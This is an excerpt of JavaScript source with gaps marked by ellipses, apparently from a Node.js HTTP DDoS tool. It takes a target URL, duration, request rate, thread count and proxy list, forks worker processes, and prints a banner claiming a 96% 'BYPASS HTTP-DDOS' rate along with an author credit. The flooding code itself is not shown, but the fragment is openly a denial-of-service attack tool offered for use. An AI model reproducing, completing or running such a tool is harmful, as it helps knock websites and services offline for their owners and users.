...
if (process.argv.length < 7) {
  console.log('node raw target time rate thread GET proxy'.rainbow);
  process.exit();
}
...
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
    console.log(`Made by @vchhoang with`+` luv <3`.red)
    ...
    console.log(`---------------------------------------------------------`.white)
    console.log('|[!]Note:'.red + coloredString +'| BYPASS HTTP-DDOS: 96%.|'.white)
    console.log(`---------------------------------------------------------`.white);
       cluster.fork();
